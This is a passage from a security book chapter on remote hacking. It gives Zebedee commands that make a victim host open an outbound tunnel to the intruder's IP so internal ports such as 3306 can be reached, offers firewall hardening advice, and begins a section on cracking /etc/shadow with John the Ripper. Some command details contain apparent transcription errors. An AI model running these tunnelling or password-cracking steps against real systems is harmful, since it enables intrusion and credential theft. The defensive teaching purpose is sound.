# Chapter 4: Remote Hacking 109

First, the intruder may run the following command on his or her host:

```
[intruder_s_host]$ zebedee -1 3306*:3306 -T 80
```

Now, the intruder must run the following on the victim host:

```
[victim_host]$ zebedee -T 80 -c intruder's_ip_address -s 127.0.0.1
```

This command will cause the Zebeed server process on the victim host to initiate an outbound connection to the Zebeed client listening port 80 of the intruder's host. When the intruder connects to port 3306 of his or her machine (127.0.0.1), he or she will be in connected to port 3306 of the victim's machine via the Zebeed tunnel.

An intruder may run the ifconfig -n commands on the victim host to identify additional network cards that may allow connections to internal networks. The intruder may use an internal IP address of 127.0.0.1 in the preceding command to perform remote port-forwarding of ports listening on hosts in the victim's internal network.

# Harden Firewall Rules

Tighten your firewall rules as much as possible. Make sure to also restrict outgoing connections. For example, a host whose purpose is to only act as a web server must not be allowed to initiate outbound connections on any port.

# CRACKING /etc/shadow

Most Unix and Linux distributions use shadowed passwords by default, where encrypted password hashes are stored in the /etc/shadow file. This is read-only by root. Assuming an intruder has gained root access to a host, he or she may use a password cracker to crack the passwords.

# Using John to Crack /etc/shadow

John the Ripper can be used to crack /etc/shadowpwd:

